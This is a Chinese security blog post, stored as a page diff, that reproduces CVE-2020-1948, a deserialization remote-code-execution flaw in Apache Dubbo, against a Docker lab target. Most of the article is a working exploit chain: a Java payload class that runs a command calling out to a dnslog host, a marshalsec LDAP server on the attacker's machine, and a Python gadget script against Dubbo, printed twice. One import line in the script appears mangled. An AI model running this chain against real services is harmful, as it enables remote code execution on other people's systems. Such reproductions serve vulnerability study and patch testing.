@@ -1,0 +1,332 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Apache_Dubbo_反序列化漏洞 | h0ld1rs的随手记</title><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="对dubbo反序列化的记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache_Dubbo_反序列化漏洞">
+<meta property="og:url" content="https://h0ld1rs.github.io/2021/07/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="h0ld1rs的随手记">
+<meta property="og:description" content="对dubbo反序列化的记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://h0ld1rs.github.io/img/image/1.png">
+<meta property="article:published_time" content="2021-07-07T10:02:03.000Z">
+<meta property="article:modified_time" content="2021-07-31T06:41:26.780Z">
+<meta property="article:author" content="h0ld1rs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h0ld1rs.github.io/img/image/1.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/2021/07/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-31 14:41:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/image/1.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的随手记</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">Apache_Dubbo_反序列化漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-07T10:02:03.000Z" title="发表于 2021-07-07 18:02:03">2021-07-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-31T06:41:26.780Z" title="更新于 2021-07-31 14:41:26">2021-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/API%E7%A0%94%E7%A9%B6/">API研究</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CVE-2020-1948"><a href="#CVE-2020-1948" class="headerlink" title="CVE-2020-1948"></a>CVE-2020-1948</h1><h2 id="APache-Dubbo简介"><a href="#APache-Dubbo简介" class="headerlink" title="APache Dubbo简介"></a>APache Dubbo简介</h2><p>Dubbo是一个分布式服务框架，致力于提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。简单的说，dubbo就是个服务框架，如果没有分布式的需求，其实是不需要用的，只有在分布式的时候，才有dubbo这样的分布式服务框架的需求，并且本质上是个服务调用的东东，说白了就是个远程服务调用的分布式框架（告别Web Service模式中的WSdl，以服务者与消费者的方式在dubbo上注册） 其核心部分包含:</p>
+<ul>
+<li>远程通讯: 提供对多种基于长连接的NIO框架抽象封装，包括多种线程模型，序列化，以及“请求-响应”模式的信息交换方式。</li>
+<li>集群容错: 提供基于接口方法的透明远程过程调用，包括多协议支持，以及软负载均衡，失败容错，地址路由，动态配置等集群支持。</li>
+<li>自动发现: 基于注册中心目录服务，使服务消费方能动态的查找服务提供方，使地址透明，使服务提供方可以平滑增加或减少机器。</li>
+</ul>
+<p>下图是官方的工作原理图和解释</p>
+<p><img src="https://images.seebug.org/content/images/2020/07/0e3a57cb-c5c4-477c-aa68-da039c1e35c5.png-w331s" alt=" "></p>
+<blockquote>
+<p>async 异步</p>
+<p>sync 同步</p>
+</blockquote>
+<ul>
+<li><strong>Provider</strong> :暴露服务方称为<code>服务提供者</code></li>
+<li><strong>Consumer</strong>  :调用远程服务方称为<code>服务消费者</code></li>
+<li><strong>Rrgister</strong>：服务注册与发现的中心目录服务称之为<code>服务注册中心</code></li>
+<li><strong>Monitor</strong>：统计服务的调用次数和 时间的日志服务称为<code>服务监控中心</code></li>
+<li><strong>Container</strong>：服务运行容器</li>
+</ul>
+<p>Provider将本地提供的远程方法在注册中心进行注册，Consumer需要调用时会先去注册中心进行查询，根据注册中心返回的结果再去对应的Provider中调用对应的远程方法，如果有变更，注册中心将基于长连接推送变更数据给Consumer 。</p>
+<p>启动注册中心，Apache dubbo 推荐使用的注册中心时Apache ZooKeeper注册中心 下载地址<a target="_blank" rel="noopener" href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p>
+<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><blockquote>
+<p>影响版本</p>
+<p>Dubbo 2.7.0 - 2.7.6</p>
+<p>Dubbo 2.6.0 - 2.6.7</p>
+<p>Dubbo 2.5.x </p>
+</blockquote>
+<h3 id="docker操作"><a href="#docker操作" class="headerlink" title="docker操作"></a>docker操作</h3><p><code>docker pull dsolab/dubbo:cve-2020-1948</code></p>
+<p><code>docker run -p 12345:12345 dsolab/dubbo:cve-2020-1948 -d</code></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
+<li><p>编写<code>java</code>代码，进行简单的命令执行，这里以<code>ping</code>命令为例，用检测无回显的<code>dnslog</code>用于验证</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">exp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="string">&quot;ping zqmp97.dnslog.cn&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编译<code>java代码</code>为<code>class</code>文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac poc.java</span><br></pre></td></tr></table></figure>
+
+<p>最后得到<code>class</code>文件，这里遇到了一下<strong>javac -bash command not found</strong>的问题</p>
+<p>使用如下命令解决</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install java-1.8.0-openjdk-devel.x86_64</span><br></pre></td></tr></table></figure>
+
+<p>原因：下载的时候只执行了<code>yum install java</code>,导致不是完整的<code>jdk</code></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sirdong/p/11987639.html">https://www.cnblogs.com/sirdong/p/11987639.html</a></p>
+</li>
+<li><p>启动静态网站服务，<code>apache</code>,<code>nginx</code>都可以，这里以python 开启80端口的web服务为例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731143924.png"></p>
+</li>
+<li><p>在另一个终端下载<code>marshalsec</code>,启动<code>LDAP代理服务</code></p>
+<p>下载地址: <a target="_blank" rel="noopener" href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://vps/<span class="comment">#exp 777</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/11266087.html">https://www.cnblogs.com/afanti/p/11266087.html</a></p>
+<p>​                    <a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/107942941">https://blog.csdn.net/whatday/article/details/107942941</a></p>
+<blockquote>
+<p><strong>LDAP</strong>：轻型目录访问协议<strong>（<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%8B%B1%E6%96%87">英文</a>：</strong>Lightweight Directory Access Protocol<strong>）是一个开放的，中立的，工业标准的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE">应用协议</a>，通过<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IP%E5%8D%8F%E8%AE%AE">IP协议</a>提供访问控制和维护分布式信息的目录信息。</strong>轻型目录访问协议<strong>（<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%8B%B1%E6%96%87">英文</a>：</strong>Lightweight Directory Access Protocol<strong>，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BC%A9%E5%86%99">缩写</a>：</strong>LDAP**，/ˈɛldæp/）是一个开放的，中立的，工业标准的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE">应用协议</a>，通过<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IP%E5%8D%8F%E8%AE%AE">IP协议</a>提供访问控制和维护分布式信息的目录信息。</p>
+</blockquote>
+<blockquote>
+<p>marshalsec 的用法,使用形式如下</p>
+<p>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [&lt;arguments…&gt;]]</p>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<p>参数说明</p>
+<ul>
+<li>-a：生成exploit下的所有payload(例如：hessian下的SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin）</li>
+<li>-t：对生成的payloads进行解码测试</li>
+<li>-v：verbose mode, 展示生成的payloads</li>
+<li>gadget_type：指定使用的payload</li>
+<li>arguments - payload运行时使用的参数</li>
+<li>marshalsec.<marshaller>：指定exploits，根目录下的java文件名</li>
+</ul>
+</blockquote>
+<ol start="5">
+<li><p>编写python的脚本<code>exp.py</code></p>
+<p>在此之前，需要安装模块</p>
+<blockquote>
+<p>pip install dubbo-py</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dubbodbcRowSetImpl.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">  print(<span class="string">&#x27;Usage: python &#123;&#125; DUBBO_HOST DUBBO_PORT LDAP_URL&#x27;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">  print(<span class="string">&#x27;\nExample:\n\n- python &#123;&#125; 1.1.1.1 12345 ldap://1.1.1.6:80/exp&#x27;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">  sys.exit()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">client = DubboClient(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">  <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">  dataSource=sys.argv[<span class="number">3</span>],</span><br><span class="line">  strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">  )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">  <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">  name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">  )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">  <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">  beanClass=JdbcRowSetImplClass,</span><br><span class="line">  obj=JdbcRowSetImpl</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">  service_name=<span class="string">&#x27;org.apache.dubbo.spring.boot.sample.consumer.DemoService&#x27;</span>,</span><br><span class="line">  <span class="comment"># 此处可以是 $invoke、$invokeSync、$echo 等，通杀 2.7.7 及 CVE 公布的所有版本。</span></span><br><span class="line">  method_name=<span class="string">&#x27;$invoke&#x27;</span>,</span><br><span class="line">  args=[toStringBean])</span><br><span class="line"></span><br><span class="line">output = <span class="built_in">str</span>(resp)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Fail to decode request due to: RpcInvocation&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">  print(<span class="string">&#x27;[!] Target maybe not support deserialization.&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">   print(<span class="string">&#x27;[+] Succeed.&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">&#x27;[!] Output:&#x27;</span>)</span><br><span class="line">  print(output)</span><br><span class="line">  print(<span class="string">&#x27;[!] Target maybe not use dubbo-remoting library.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行相应的py脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 目标vps ldap://己方vps:<span class="number">777</span>/exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731144111.png"></p>
+</li>
+</ol>
+<p>出现<code>success</code>的时候，说明成功</p>
+<p>然后观察<code>dnslog</code>，也可以发现回显</p>
+<p><img src="https://raw.githubusercontent.com/h0ld1rs/image/main/image/20210731140258.png"></p>
+<p>同时我们可以留意一下相关的LDAP服务，当出现转发成功的时候，自然也是成功的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731144049.png"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46137328/article/details/107194560?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.base&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.base">https://blog.csdn.net/weixin_46137328/article/details/107194560?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.base&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.base</a></p>
+<h2 id="原理研究"><a href="#原理研究" class="headerlink" title="原理研究"></a>原理研究</h2><p>源码版本：dubbo  v2.7.6    </p>
+<p>下载地址：<strong><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo-spring-boot-project/tree/35568ff32d3a0fcbbd6b3e14a9f7c0a71b6b08ee">https://github.com/apache/dubbo-spring-boot-project/tree/35568ff32d3a0fcbbd6b3e14a9f7c0a71b6b08ee</a></strong></p>
+<p>下载后，将项目导入IDEA</p>
+<p>我们开始分析一下现有的<code>exp</code></p>
+<h3 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dubbodbcRowSetImpl.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">  print(<span class="string">&#x27;Usage: python &#123;&#125; DUBBO_HOST DUBBO_PORT LDAP_URL&#x27;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">  print(<span class="string">&#x27;\nExample:\n\n- python &#123;&#125; 1.1.1.1 12345 ldap://1.1.1.6:80/exp&#x27;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">  sys.exit()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">client = DubboClient(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">  <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">  dataSource=sys.argv[<span class="number">3</span>],</span><br><span class="line">  strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">  )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">  <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">  name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">  )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">  <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">  beanClass=JdbcRowSetImplClass,</span><br><span class="line">  obj=JdbcRowSetImpl</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">  service_name=<span class="string">&#x27;org.apache.dubbo.spring.boot.sample.consumer.DemoService&#x27;</span>,</span><br><span class="line">  <span class="comment"># 此处可以是 $invoke、$invokeSync、$echo 等，通杀 2.7.7 及 CVE 公布的所有版本。</span></span><br><span class="line">  method_name=<span class="string">&#x27;$invoke&#x27;</span>,</span><br><span class="line">  args=[toStringBean])</span><br><span class="line"></span><br><span class="line">output = <span class="built_in">str</span>(resp)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Fail to decode request due to: RpcInvocation&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">  print(<span class="string">&#x27;[!] Target maybe not support deserialization.&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">   print(<span class="string">&#x27;[+] Succeed.&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">&#x27;[!] Output:&#x27;</span>)</span><br><span class="line">  print(output)</span><br><span class="line">  print(<span class="string">&#x27;[!] Target maybe not use dubbo-remoting library.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
